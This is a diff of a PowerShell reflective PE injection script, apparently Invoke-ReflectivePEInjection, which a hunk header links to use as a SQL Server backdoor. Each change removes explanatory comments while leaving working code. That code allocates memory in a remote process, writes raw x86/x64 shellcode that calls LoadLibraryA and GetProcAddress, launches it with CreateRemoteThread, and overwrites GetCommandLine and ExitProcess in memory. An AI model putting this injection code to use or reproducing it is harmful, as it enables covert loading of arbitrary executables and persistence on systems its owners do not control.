-			#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
+			
 			[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
 			[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
 
-			#Get NtHeadersInfo
+			
 			$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
 
-			#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
+			
 			$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
 			$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
 			$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
 			$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
 			$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
 
-			#Free the memory allocated above, this isn't where we allocate the PE to memory
+			
 			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
 
 			return $PEInfo
 		}
 
 
-		#PEInfo must contain the following NoteProperties:
-		#	PEHandle: An IntPtr to the address the PE is loaded to in memory
+		
+		
 		Function Get-PEDetailedInfo {
 			Param(
 				[Parameter( Position = 0, Mandatory = $true)]
@@ -1228,10 +1048,10 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 			$PEInfo = New-Object System.Object
 
-			#Get NtHeaders information
+			
 			$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
 
-			#Build the PEInfo object
+			
 			$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
 			$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
 			$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
@@ -1292,20 +1112,20 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
-			$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
+			$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") 
 
 			[IntPtr]$DllAddress = [IntPtr]::Zero
-			#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
-			#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
+			
+			
 			if ($PEInfo.PE64Bit -eq $true) {
-				#Allocate memory for the address returned by LoadLibraryA
+				
 				$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 				if ($LoadLibraryARetMem -eq [IntPtr]::Zero) {
 					Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
 				}
 
 
-				#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
+				
 				$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
 				$LoadLibrarySC2 = @(0x48, 0xba)
 				$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
@@ -1347,7 +1167,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 				}
 
-				#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
+				
 				[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 				$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
 				if ($Result -eq $false) {
@@ -1392,7 +1212,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 				[Parameter(Position = 2, Mandatory = $true)]
 				[IntPtr]
-				$FunctionNamePtr, #This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)
+				$FunctionNamePtr, 
 
 				[Parameter(Position = 3, Mandatory = $true)]
 				[Bool]
@@ -1401,12 +1221,12 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 			$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 
-			[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
-			#If not loading by ordinal, write the function name to the remote process memory
+			[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   
+			
 			if (-not $LoadByOrdinal) {
 				$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)
 
-				#Write FunctionName to memory (will be used in GetProcAddress)
+				
 				$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
 				$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 				if ($RFuncNamePtr -eq [IntPtr]::Zero) {
@@ -1422,25 +1242,25 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
 				}
 			}
-			#If loading by ordinal, just set RFuncNamePtr to be the ordinal number
+			
 			else {
 				$RFuncNamePtr = $FunctionNamePtr
 			}
 
-			#Get address of GetProcAddress
+			
 			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
-			$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes
+			$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") 
 
 
-			#Allocate memory for the address returned by GetProcAddress
+			
 			$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 			if ($GetProcAddressRetMem -eq [IntPtr]::Zero) {
 				Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
 			}
 
 
-			#Write Shellcode to the remote process which will call GetProcAddress
-			#Shellcode: GetProcAddress.asm
+			
+			
 			[Byte[]]$GetProcAddressSC = @()
 			if ($PEInfo.PE64Bit -eq $true) {
 				$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
@@ -1495,7 +1315,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 			}
 
-			#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
+			
 			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
 			if (($Result -eq $false) -or ($NumBytesWritten -eq 0)) {
@@ -1503,7 +1323,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 			[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
 
-			#Cleanup remote process memory
+			
 			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 
@@ -1538,13 +1358,13 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
 				$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
 
-				#Address to copy the section to
+				
 				[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
 
-				#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
-				#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
-				#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
-				#    so truncate SizeOfRawData to VirtualSize
+				
+				
+				
+				
 				$SizeOfRawData = $SectionHeader.SizeOfRawData
 
 				if ($SectionHeader.PointerToRawData -eq 0) {
@@ -1560,7 +1380,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
 				}
 
-				#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
+				
 				if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize) {
 					$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
 					[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
@@ -1591,10 +1411,10 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			)
 
 			[Int64]$BaseDifference = 0
-			$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
+			$AddDifference = $true 
 			[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
 
-			#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
+			
 			if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
 					-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0)) {
 				return
@@ -1609,10 +1429,10 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
 			}
 
-			#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
+			
 			[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
 			while ($true) {
-				#If SizeOfBlock == 0, we are done
+				
 				$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
 
 				if ($BaseRelocationTable.SizeOfBlock -eq 0) {
@@ -1622,25 +1442,25 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
 				$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2
 
-				#Loop through each relocation
+				
 				for ($i = 0; $i -lt $NumRelocations; $i++) {
-					#Get info for this relocation
+					
 					$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
 					[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])
 
-					#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
+					
 					[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
 					[UInt16]$RelocType = $RelocationInfo -band 0xF000
 					for ($j = 0; $j -lt 12; $j++) {
 						$RelocType = [Math]::Floor($RelocType / 2)
 					}
 
-					#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
-					#This appears to be true for EXE's as well.
-					#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
+					
+					
+					
 					if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
 							-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64)) {
-						#Get the current memory address and update it based off the difference between PE expected base address and actual base address
+						
 						[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
 						[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
 
@@ -1654,7 +1474,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 						[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
 					}
 					elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE) {
-						#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
+						
 						Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
 					}
 				}
@@ -1698,7 +1518,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				while ($true) {
 					$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
 
-					#If the structure is null, it signals that this is the end of the array
+					
 					if ($ImportDescriptor.Characteristics -eq 0 `
 							-and $ImportDescriptor.FirstThunk -eq 0 `
 							-and $ImportDescriptor.ForwarderChain -eq 0 `
@@ -1723,24 +1543,24 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 						throw "Error importing DLL, DLLName: $ImportDllPath"
 					}
 
-					#Get the first thunk, then loop through all of them
+					
 					[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
-					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
+					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
 					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
 
 					while ($OriginalThunkRefVal -ne [IntPtr]::Zero) {
 						$LoadByOrdinal = $false
 						[IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
-						#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
-						#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
-						#	and doing the comparison, just see if it is less than 0
+						
+						
+						
 						[IntPtr]$NewThunkRef = [IntPtr]::Zero
 						if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0) {
-							[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
+							[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff 
 							$LoadByOrdinal = $true
 						}
 						elseif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0) {
-							[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
+							[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff 
 							$LoadByOrdinal = $true
 						}
 						else {
@@ -1772,8 +1592,8 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 						[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
 						[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
 
-						#Cleanup
-						#If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
+						
+						
 						if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero)) {
 							[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
 							$ProcedureNamePtr = [IntPtr]::Zero
@@ -1873,8 +1693,8 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 		}
 
-		#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
-		#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
+		
+		
 		Function Update-ExeFunctions {
 			Param(
 				[Parameter(Position = 0, Mandatory = $true)]
@@ -1898,7 +1718,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				$ExeDoneBytePtr
 			)
 
-			#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
+			
 			$ReturnArray = @()
 
 			$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
@@ -1914,9 +1734,9 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				throw "KernelBase handle null"
 			}
 
-			#################################################
-			#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
-			#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
+			
+			
+			
 			$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
 			$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
 
@@ -1927,10 +1747,10 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
 			}
 
-			#Prepare the shellcode
+			
 			[Byte[]]$Shellcode1 = @()
 			if ($PtrSize -eq 8) {
-				$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
+				$Shellcode1 += 0x48	
 			}
 			$Shellcode1 += 0xb8
 
@@ -1938,7 +1758,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
 
 
-			#Make copy of GetCommandLineA and GetCommandLineW
+			
 			$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 			$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 			$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
@@ -1946,7 +1766,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$ReturnArray += , ($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
 			$ReturnArray += , ($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
 
-			#Overwrite GetCommandLineA
+			
 			[UInt32]$OldProtectFlag = 0
 			$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 			if ($Success = $false) {
@@ -1963,7 +1783,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 
 
-			#Overwrite GetCommandLineW
+			
 			[UInt32]$OldProtectFlag = 0
 			$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 			if ($Success = $false) {
@@ -1978,14 +1798,14 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
 
 			$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
-			#################################################
+			
 
 
-			#################################################
-			#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
-			#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
-			#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
-			#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
+			
+			
+			
+			
+			
 			$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
 					, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
 
@@ -2001,7 +1821,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
 					$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
 
-					#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
+					
 					$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
 					$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
 					$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
@@ -2026,16 +1846,16 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
 				}
 			}
-			#################################################
+			
 
 
-			#################################################
-			#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.
+			
+			
 
 			$ReturnArray = @()
-			$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
+			$ExitFunctions = @() 
 
-			#CorExitProcess (compiled in to visual studio c++)
+			
 			[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
 			if ($MscoreeHandle -eq [IntPtr]::Zero) {
 				throw "mscoree handle null"
@@ -2046,7 +1866,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 			$ExitFunctions += $CorExitProcessAddr
 
-			#ExitProcess (what non-managed programs use)
+			
 			[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
 			if ($ExitProcessAddr -eq [IntPtr]::Zero) {
 				Throw "ExitProcess address not found"
@@ -2056,11 +1876,11 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			[UInt32]$OldProtectFlag = 0
 			foreach ($ProcExitFunctionAddr in $ExitFunctions) {
 				$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
-				#The following is the shellcode (Shellcode: ExitThread.asm):
-				#32bit shellcode
+				
+				
 				[Byte[]]$Shellcode1 = @(0xbb)
 				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
-				#64bit shellcode (Shellcode: ExitThread.asm)
+				
 				if ($PtrSize -eq 8) {
 					[Byte[]]$Shellcode1 = @(0x48, 0xbb)
 					[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
@@ -2078,13 +1898,13 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					Throw "Call to VirtualProtect failed"
 				}
 
-				#Make copy of original ExitProcess bytes
+				
 				$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 				$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
 				$ReturnArray += , ($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
 
-				#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
-				#	call ExitThread
+				
+				
 				Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
 				$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
 				[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
@@ -2097,14 +1917,14 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 				$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 			}
-			#################################################
+			
 
 			Write-Output $ReturnArray
 		}
 
 
-		#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
-		#	It copies Count bytes from Source to Destination.
+		
+		
 		Function Copy-ArrayOfMemAddresses {
 			Param(
 				[Parameter(Position = 0, Mandatory = $true)]
@@ -2134,9 +1954,9 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 		}
 
 
-		#####################################
-		##########    FUNCTIONS   ###########
-		#####################################
+		
+		
+		
 		Function Get-MemoryProcAddress {
 			Param(
 				[Parameter(Position = 0, Mandatory = $true)]
@@ -2152,7 +1972,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$Win32Constants = Get-Win32Constants
 			$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 
-			#Get the export table
+			
 			if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0) {
 				return [IntPtr]::Zero
 			}
@@ -2160,14 +1980,14 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
 
 			for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++) {
-				#AddressOfNames is an array of pointers to strings of the names of the functions exported
+				
 				$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
 				$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
 				$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
 
 				if ($Name -ceq $FunctionName) {
-					#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
-					#    which contains the offset of the function in to the DLL
+					
+					
 					$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
 					$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
 					$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
@@ -2201,7 +2021,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 			$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 
-			#Get Win32 constants and functions
+			
 			$Win32Constants = Get-Win32Constants
 			$Win32Functions = Get-Win32Functions
 			$Win32Types = Get-Win32Types
